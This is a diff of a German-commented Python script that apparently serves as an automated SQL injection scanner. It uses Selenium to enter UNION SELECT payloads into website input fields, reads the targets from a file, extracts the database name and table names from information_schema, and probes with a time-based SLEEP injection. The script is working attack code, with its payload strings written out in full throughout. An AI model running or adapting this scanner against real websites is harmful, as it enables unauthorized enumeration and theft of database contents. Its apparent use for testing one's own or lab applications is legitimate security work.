@@ -1,6 +1,3 @@
-# Import necessary modules
-
-#Grund Problem bei allem, wie viel darf vorgegeben werden?
 import time
 from selenium import webdriver
 from selenium.webdriver.common.keys import Keys
@@ -21,6 +18,8 @@ init()
 INJECTION_STRING = "INJECTIONPOSIBLE"
 MAX_TABLE_SIZE = 3
 
+#Zeit beim warten
+timeWait = 0.5
 #Was wir herausgefunden haben:
 injectionPossible = False
 nameOfDatabase = ""
@@ -30,12 +29,7 @@ nameOfTables = []
 websiteFile = "websiteFile.txt"
 resultFile  = "resultFile.txt"
 
-"""FÜhrt injections versuche auf einem input feld aus
-BRUTFORCE für die anzahl der spalten"""
-def runInjection():
-    checkString = "1 UNION SELECT ".INJECTION_STRING
-
-"""Scheckt anhand des resultats ob eine INjection erfolgreich war"""
+"""Scheckt anhand des resultats ob eine Injection erfolgreich war"""
 def checkIfInjectionIsSuccessful(pageContent):
     global injectionPossible
     if(pageContent.find(INJECTION_STRING) != -1):
@@ -46,14 +40,6 @@ def checkIfInjectionIsSuccessful(pageContent):
         print(Fore.GREEN + "KEINE Injection möglich!" + Style.RESET_ALL)
         return False
 
-""" Wenn injections möglich sind können weitere Daten herausgefunden werden, Version, schema etc"""
-def informationGathering():
-    #show Tables
-    #describe MY_DATABASE.user_info
-    #SHOW COLUMNS FROM user_info
-    pass
-
-#Hilfs Funktionen
 """Zum aufrufen einer website und inserten 1 Befehles 
  @url gibt die url an die angesteuert wird
  @id die id des input feldes
@@ -62,21 +48,23 @@ def goToWebsiteAndInsert(url, id, string):
     print("Wir gehen zur website " + str(url) + " versuchen an dem input feld " + str(id) + " den string " + str(string))
     driver = webdriver.Chrome()
     driver.get(url)
-    time.sleep(2)
+    time.sleep(timeWait)
     input_field = driver.find_element(By.ID, id)
     input_field.send_keys(string)
+    time.sleep(timeWait)
     input_field.send_keys(Keys.RETURN)
-    time.sleep(2)
+    time.sleep(timeWait)
     return driver.page_source
 
-"""Schneidet aus einer HTML antwort alles raus und gibt nur relevantes zurücl """
+"""Schneidet aus einer HTML antwort alles raus und gibt nur relevantes zurück 
+@messyString übergabe string aus welchen das ergebnis rausgelesen werden soll
+"""
 def clearResult(messyString):
     soup = BeautifulSoup(messyString, 'html.parser')
     text = ' '.join(soup.find_all(text=True))
     text = ' '.join(text.split())
     matching_words = []
     words = text.split()
-    # Iterate through the list of words
     for i, word in enumerate(words):
         if word.startswith("START") and word.endswith("ENDE"):
             matching_words.append(word)
@@ -85,29 +73,30 @@ def clearResult(messyString):
         endWords.append(word[5:-4])
     return endWords
 
+"""Ruft findOutTablesUnionTable auf
+ @websitObject array mit url und inputfields
+ @databaseName name der datenbank als Sting"""
 def findOutTableNamesCaller(websitObject, databaseName):
     result = "NICHT_ERKENBAR"
-    print("Caller aufgerufen")
     try:
         for i in range(MAX_TABLE_SIZE):
             if result == "NICHT_ERKENBAR":
                 result = findOutTablesUnionTable(websitObject["url"], i, websitObject["inputfields"][0], databaseName)
-                print("Resutlt wird ausgegebe: ")
-                print(result)
-        if result == "NICHT_ERKENBAR":
-            result = False
     except:
         pass
-    #zum testen
     return result
 
-"""Versucht herauszufidenn was für Tablen es gibt. Dabei muss es um ein String injection handeln """
+"""Versucht herauszufidenn was für Tablen es gibt.
+ @url url die getestet werden soll
+ @extaColums wie viele filler eingebaut werden sollen
+ @id id des Input feldes das getestet werden soll
+ @database Name der datenbank"""
 def findOutTablesUnionTable(url, extraColumns, id, database="MY_DATABASE"):
     try:
         fillerString = ""
         for i in range(extraColumns):
             fillerString = fillerString + "NULL as col" + str(i) + ","
-        injectionString = '" UNION SELECT ' + str(fillerString) + ' CONCAT("START", GROUP_CONCAT(table_name), "ENDE") FROM information_schema.tables WHERE table_schema = "' + str(database)+ '"#'      #[] das problem
+        injectionString = '" UNION SELECT ' + str(fillerString) + ' CONCAT("START", GROUP_CONCAT(table_name), "ENDE") FROM information_schema.tables WHERE table_schema = "' + str(database)+ '"#'
         pageContent = goToWebsiteAndInsert(url, id,injectionString)
         tableNames = clearResult(pageContent)
         if tableNames:
@@ -115,7 +104,10 @@ def findOutTablesUnionTable(url, extraColumns, id, database="MY_DATABASE"):
     except:
         pass
     return "NICHT_ERKENBAR"
-""""""
+"""
+@websiteObject URL und inputfeld
+Caller für das Datenbank herausfinden
+"""
 def findOutNameOFDatabaseCaller(websitObject):
     try:
         result = "NICHT_ERKENBAR"
@@ -127,24 +119,30 @@ def findOutNameOFDatabaseCaller(websitObject):
         return result
     except:
         return False
-"""geht nur wenn es sich um string handelt """
+"""
+@url Die URL die aufgerufen werden soll
+@id  Die id des inputfeldes
+@extraColumns wie viele Füller gemacht werden sollen
+geht nur wenn es sich um string handelt
+"""
 def findOutNameOfDatabase(url, id, extraColumns):
     try:
-
         global nameOfDatabase
         fillerString = ""
         for i in range(extraColumns):
             fillerString = fillerString + "NULL as col" + str(i) + ","
         injectionString = '" Union SELECT ' + fillerString  + ' CONCAT("START", Database(), "ENDE") #'
-        pageContent =goToWebsiteAndInsert(url,id, injectionString)
+        pageContent = goToWebsiteAndInsert(url,id, injectionString)
         database = clearResult(pageContent)
         if database:
-            return database
+            return database[0]
         else:
             return "NICHT_ERKENBAR"
     except:
         return "NICHT_ERKENBAR"
-"""Ruft unioonAttackOnTanble auf mit unterschiedlichjer anzahl an colums """
+"""Ruft unionAttackOnTanble auf mit unterschiedlichjer anzahl an colums 
+@url die Url von der website
+@id die id von der website"""
 def tableTest(url, id):
     result = False
     for i in range(MAX_TABLE_SIZE):
@@ -152,7 +150,10 @@ def tableTest(url, id):
             result = unionAttackOnTable(url, i, id)
     return result
 
-"""Wird von table test aufgerufen, testet einen Table mit definierten COllum größe """
+"""Wird von table test aufgerufen, testet einen Table mit definierten COllum größe
+ @url Die URL die aufgerufen werden soll
+@id  Die id des inputfeldes
+@extraColumns wie viele Füller gemacht werden sollen"""
 def unionAttackOnTable(url, extraColumns, id):
     fillerString = ""
     for i in range(extraColumns):
@@ -162,6 +163,10 @@ def unionAttackOnTable(url, extraColumns, id):
     result = checkIfInjectionIsSuccessful(result)
     return  result
 
+"""
+@websiteObject URL und inputfeld
+Caller um die SQL version herauzufinden
+"""
 def sqlTypidentifizierenCaller(websitObject):
     try:
         result = "NICHT_ERKENBAR"
@@ -174,7 +179,10 @@ def sqlTypidentifizierenCaller(websitObject):
         result = False
     return result
 
-"""versucht den typ herauszufinden """
+"""versucht den typ herauszufinden 
+@url Die URL die aufgerufen werden soll
+@id  Die id des inputfeldes
+@extraColumns wie viele Füller gemacht werden sollen"""
 def sqlTypidentifizieren(url, extraColumns, id):
     try:
         fillerString = ""
@@ -190,29 +198,9 @@ def sqlTypidentifizieren(url, extraColumns, id):
             return "NICHT_ERKENBAR"
     except:
         return "NICHT_ERKENBAR"
-
-def tableLogic(url, id):
-    global injectionPossible
-    global nameOfDatabase
-    global nameOfTables
-
-    for i in range(MAX_TABLE_SIZE):
-        unionAttackOnTable(url,i,id)
-    if(injectionPossible == True):
-        for i in range(MAX_TABLE_SIZE):
-            database = findOutNameOfDatabase(url,"searProcuct", i)
-            if database:
-                nameOfDatabase = database[0]
-        if database:
-            for i in range(MAX_TABLE_SIZE):
-                tables = findOutTablesUnionTable(url, i, nameOfDatabase)
-                if tables:
-                    nameOfTables = tables
-
-        print("injection war möglich")
-        print("Die datenbank heisßt" + nameOfDatabase)
-        print("Die tabellen heißen: " + nameOfTables)
-
+"""
+Liest das File ein um die url, input kombination aufzubauen
+"""
 def readFileForWebsites():
     targets = []
     with open(websiteFile, 'r') as f:
@@ -226,33 +214,39 @@ def readFileForWebsites():
             website["inputfields"] = parts
             targets.append(website)
     return targets
+"""
+Schreibt das ergebnis in das File
+@result die einzelenen kombinationen
+@advanced die inormationen über Datenbank name, SQL art und Tables.
+"""
 def writeResultInFile(result, advanced = None):
     with open(resultFile, "w") as f:
         for line in result:
             string = "Das Inputfiled mit der id : " + str(line["inputfields"][0]) + " Auf der Website : " + str(line["url"]) + " hat"
             if(line["testResult"] is True):
-                string += " eine sichereheits Luecke Fuer SQL injection! \n"
+                string += " Eine Sicherheitslücke für SQL injection! \n"
             else:
                 string += " Nach den Tests dieses Botes KEINE SQL injections \n"
             f.write(string)
         if advanced is not None:
-            print("Es folgt advanced : ")
-            print(advanced)
             tabellename = ""
             #tabellennameAls string
             for name in advanced["tabellenName"]:
                 tabellename += name
             f.write("datenBankName: " + str(advanced["datenBankName"]) + ", sqlVariante : " + str(advanced["sqlVariante"]) + ", tabellenName: " + tabellename + "\n")
-        f.write("Bitte beachte das dieser Bot nur bestimmte SQL injections abfragt, dass nicht finden bedeutet nicht das die websiten sicher sind")
-""" TImmer injection  welche  checckWebsiteTimmer aufruft um über zeit herauszufinden ob incetion möglich war"""
+        f.write("Bitte beachte dass dieser Bot nur bestimmte SQL injections abfragt, dass nicht finden bedeutet nicht dass die webseiten sicher sind")
+"""
+ @url url vond der website
+ @id  id des input feldes
+ TImmer injection  welche  checckWebsiteTimmer aufruft um über zeit herauszufinden ob incetion möglich war"""
 def timmerAttack(url, id):
-    delayTime = 8                                       #seconds which are delay from thread
+    delayTime = 18
     thread = threading.Thread(target=checckWebsiteTimmer, args=(url,id))
     start_time = time.perf_counter()
     thread.start()
     thread.join()
     elapsed_time = time.perf_counter() - start_time
-    if(elapsed_time > 18):
+    if(elapsed_time > delayTime):
         print("INJECTION möglich!")
         return True
     else:
@@ -263,7 +257,6 @@ def checckWebsiteTimmer(url,id):
     driver.get(url)
     input_field = driver.find_element(By.ID, id)
     input_field.send_keys("1 AND SLEEP(10)=0;")
-    #input_field.send_keys("1")
     input_field.send_keys(Keys.RETURN)
     driver.quit()
 
@@ -276,7 +269,6 @@ def intCheck(url, id):
 
 """Funktion welche alle möglichen angriffe ausführen soll üund für jede website ausgefüghrt werden soll """
 def websiteChecker(websiteObject):
-    result = False
     result = intCheck(websiteObject["url"], websiteObject["inputfields"][0])
     if result is False:
         result = tableTest(websiteObject["url"], websiteObject["inputfields"][0])
@@ -295,7 +287,6 @@ def __main__():
     sqlVariante   = "NICHT_ERKENBAR"
 
     websiteObjects = readFileForWebsites()
-    print(websiteObjects)
 
     injectionPosiblle = False
     for i, websiteObject in enumerate(websiteObjects):
@@ -303,8 +294,7 @@ def __main__():
         websiteObjects[i] = result[0]
         if injectionPosiblle is False:
             injectionPosiblle = result[1]
-    """
-    """
+
     #wenn injectionPosible war in einer website rest herausfinden:
     if injectionPossible is True:
         for websiteObject in websiteObjects:
@@ -312,16 +302,12 @@ def __main__():
                 print("es wird versucht DB name zu erkennen")
                 datenBankName = findOutNameOFDatabaseCaller(websiteObject)
             if datenBankName:
-                print(type(datenBankName))
                 if len(datenBankName) == 1:
                     datenBankName = datenBankName[0]
             if sqlVariante == "NICHT_ERKENBAR":
                 print("es wird versucht variante zu erkennen")
                 sqlVariante = sqlTypidentifizierenCaller(websiteObject)
 
-            print("scheck")
-            print(tabellenName)
-            print(datenBankName)
             if tabellenName == "NICHT_ERKENBAR" and datenBankName != "NICHT_ERKENBAR":
                 print("es wird versucht tabellen namen zu erkennen")
                 tabellenName  =  findOutTableNamesCaller(websiteObject, datenBankName)
@@ -339,9 +325,3 @@ def __main__():
 
 
 __main__()
-"""
-object = {}
-object["url"] = "http://localhost:8000/Views/webshopView.php"
-object["inputfields"] = ["searchProduct"]
-print(findOutTableNamesCaller(object, "MY_DATABASE"))
-"""
